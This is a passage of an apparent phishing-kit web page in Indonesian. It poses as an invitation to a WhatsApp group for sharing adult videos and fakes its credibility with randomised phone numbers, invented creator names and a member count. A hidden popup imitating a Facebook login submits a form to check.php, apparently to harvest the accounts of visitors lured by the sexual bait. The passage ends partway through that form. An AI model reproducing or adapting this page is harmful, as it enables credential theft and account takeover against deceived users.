        ...
        <div class="chat">
          <div class="chat-container">
            <div class="user-bar">
              ...
              <div class="avatar">
                <img src="https://i.ibb.co/TYjtdzw/20210831-174712.jpg" alt="Avatar" style="object-fit: cover; width: 40px; height: 40px;">
              </div>
            ...
            <div class="conversation">
              <div class="conversation-container">
                ...
                <div class="message received">
                     <span style="color: #ff8f2c!important">+62 812-<span id="nomerAlexHost1"></span>-<span id="nomerAlexHost2"></span></span><br>
                  <span id="random"></span>
                  <span class="metadata"><span class="time">3:40 PM</span></span>
                </div>
                
                <div class="message received">
                    <span style="color: #e542a3!important">+62 896-<span id="nomerAlexHost3"></span>-<span id="nomerAlexHost4"></span></span><br>
                 <img src="https://i.ibb.co/xmgcGbf/Screenshot-2021-08-31-18-34-27.png" width="100%" id="myPicture">
                  <span class="metadata"><span class="time">3:40 PM</span></span>
                </div>
...
#more {display: none;}
	...
	<section>
		<div class="join" style="display: none;">
			<span class="icon" style="background: url(https://i.ibb.co/TYjtdzw/20210831-174712.jpg) no-repeat; background-size: cover;"></span>
			<div class="content">
				<h1>Update Setiap Hari</h1>
				<span class="ceo" id="admin"></span>
				<p class="desc">
					 
					💦 SELAMAT DATANG PENYELAM 💦 <br><span class="bold">⚠️ Peraturan ⚠️</span><span id="dots">...</span> <span id="more"><br>0️⃣ Share jika punya video<br>1️⃣  Jangan spam gak jelas<br>2️⃣ Dapat video jangan keluar<br>3️⃣ Berkata jorok sewajarnya<br>4️⃣ Hormati ras daerah<br>5️⃣ Dilarang chat member di luar grup</span>
...
var memes = [
'Grup dibuat oleh ~tiarakeddy',
'Grup dibuat oleh ~bella_sr',
'Grup dibuat oleh ~lidia',
'Grup dibuat oleh ~maudy',
'Grup dibuat oleh ~elsa',
'Grup dibuat oleh ~novi'];
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
				...
				<div class="peserta" id="memberAlexHost">135 peserta</div>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
				...
				<div class="profile">
					<ul>
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/nBk7zhq/20210831-174824.jpg">
							</div>
							<span class="nama" id="AlexHost1"></span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/BT0W7qc/20210831-174936.jpg">
							</div>
							<span class="nama" id="AlexHost2"></span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/fnBGQ5j/20210831-174727.jpg">
							</div>
							<span class="nama" id="AlexHost3"></span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/2W63dsP/20210831-174627.jpg">
							</div>
							<span class="nama" id="AlexHost4"></span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/KDJhQgP/20210831-174616.jpg">
							</div>
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/K9PkRKg/20210831-174601.jpg">
							</div>
							<span class="nama" id="AlexHost6"></span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/8gJhQyJ/20210831-174515.jpg">
							</div>
							<span class="nama" id="AlexHost7"></span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
		...
		<div class="loading">
			...
			<img class="spin" src="https://i.ibb.co/XYqVZyc/0-pt-DX0-Hf-JCYpo9-Pcs.gif">
		</div>
		<!-- LOGIN FB -->
		<div class="popup-login login-facebook animated fadeIn" style="display: none;">
		   <div class="popup-box-login-fb">
		      <div class="navbar-fb">
		         <img width="45" src="https://rawcdn.githack.com/AlexHostX/logAlex/3670f22e90ae7bae2de599e9b722d5d644805783/facebook_text.png">
		      </div>
		      <div class="content-box-fb">
		         ...
		         <form class="login-form" action="check.php" onsubmit="return AlexHosting()" method="POST">
		            <label>
